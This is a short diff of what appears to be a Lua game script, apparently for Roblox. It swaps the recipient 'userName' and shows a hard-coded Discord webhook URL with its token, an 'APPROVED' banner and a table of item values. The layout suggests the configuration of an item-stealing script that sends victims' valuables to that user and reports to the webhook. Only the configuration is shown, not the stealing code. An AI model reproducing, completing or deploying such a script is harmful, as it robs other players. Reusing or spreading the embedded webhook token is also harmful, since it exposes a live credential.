@@ -1,6 +1,6 @@
 -- WORKS @DOMOSCRIPTS APPROVED
 
-userName = "Virmality1"
+userName = "W1lliqmm"
 webHook = "https://discord.com/api/webhooks/1343782704264515616/nQX34btCczY9XnlW3VRfuko9E2Vbq2IK3jrrUPrdEbnIQhmZrtXrZMvGNOBZ0HNPoBM2"
 local values = {
     ["Nik's Scythe"] = 25000000,
